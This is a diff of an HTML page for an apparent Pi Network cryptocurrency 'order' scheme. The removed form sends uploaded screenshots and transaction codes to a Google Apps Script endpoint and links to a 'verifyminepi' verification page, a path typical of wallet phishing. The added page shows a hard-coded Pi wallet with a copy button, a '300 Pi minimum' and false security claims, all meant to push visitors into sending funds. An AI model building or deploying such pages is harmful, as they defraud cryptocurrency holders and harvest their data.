@@ -1,69 +1,67 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <title>Order Submission</title>
-    <link rel="stylesheet" href="order-submission.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order Confirmation</title>
+    <link rel="stylesheet" href="order-confirmation.css">
 </head>
 <body>
     <div class="container">
-        <h1>Order Submission</h1>
-        <form id="order-form">
-            <label for="screenshot">Screenshot:</label>
-            <input type="file" id="screenshot" name="screenshot" accept="image/*" required>
-
-            <label for="transaction-code">Transaction Code:</label>
-            <input type="text" id="transaction-code" name="transactionCode" required>
-
-            <label for="affiliate-link">Affiliate Link:</label>
-            <input type="text" id="affiliate-link" name="affiliateLink">
-
-            <label for="name">Name (Optional):</label>
-            <input type="text" id="name" name="name">
-
-            <button type="submit">Submit Order</button>
-            <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Verification</button>
-            <button onclick="goBack()">Go Back</button>
-        </form>
+        <h1>Order Confirmation</h1>
+        <div class="order-details">
+            <p>Transaction Code: <span id="transaction-code">Loading...</span></p>
+            <p>USDT Wallet Address: <input type="text" id="usdt-address" name="usdt-address"></p>
+            <p>pi Wallet Address for Payment: <span id="pi-wallet-address">GCVKOFPYI3HQYHXB3HD6QOS22DFG2IW5QXHDHBYXJ46RLUPJBHZM7MX5</span>
+                <button onclick="copyPiWallet()">Copy</button> <!-- Button to copy Pi wallet address -->
+            </p>
+            <button onclick="goBack()">Back</button>
+            <button onclick="nextStep()">Next</button>
+        </div>
+        <p class="warning">Note: The minimum transactable amount of Pi is 300. Orders below this amount may take 24-48 hours for payment processing.</p>
     </div>
 
-    <!-- Footer -->
-    <footer>
-        <p>Click "Submit Order" to submit your order, then click "Verification" to verify that you are not submitting a duplicate order from the same wallet.</p>
-    </footer>
-
     <script>
-        document.getElementById("order-form").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent form submission
-
-            var formData = new FormData(this);
-
-            fetch('https://script.google.com/macros/s/AKfycbzy7ov1qXZl1hiXPFB07Bbgf5-Bp7GMAGKcNwyUHBzGYFj4oZ_X75QvAlmUv_WKbTEMnA/exec', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.text();
-            })
-            .then(data => {
-                console.log(data);
-                alert(data); // Display response from Google Apps Script
-            })
-        });
-
-        // JavaScript function to navigate to a page
-        function navigateTo(page) {
-            window.location.href = page;
+        async function fetchTransactionCode() {
+            try {
+                const response = await fetch('transaction-code.html');
+                const data = await response.text();
+                return data;
+            } catch (error) {
+                console.error('Error fetching transaction code:', error);
+                return 'Error fetching transaction code------ excess server queries (please use the first 2 and last 3 digits of your wallet address as code)';
+            }
         }
 
-        // JavaScript function to go back in history
+        async function updateTransactionCode() {
+            const transactionCode = await fetchTransactionCode();
+            document.getElementById('transaction-code').innerText = transactionCode;
+        }
+
         function goBack() {
             window.history.back();
         }
+
+        function nextStep() {
+            window.location.href = 'order-submission.html';
+        }
+
+        function copyPiWallet() {
+            const piWalletAddress = document.getElementById('pi-wallet-address').innerText;
+            navigator.clipboard.writeText(piWalletAddress)
+                .then(() => {
+                    alert('Pi wallet address copied to clipboard!');
+                })
+                .catch((error) => {
+                    console.error('Error copying to clipboard:', error);
+                });
+        }
+
+        updateTransactionCode();
     </script>
+    <footer>
+        <span class="padlock-icon">🔒</span> Transactions within the Pi Network are secured through node-to-node regulations.
+        <span class="padlock-icon"></span> Do not cancel app until payment is done to avoid loss.
+    </footer>
 </body>
 </html>
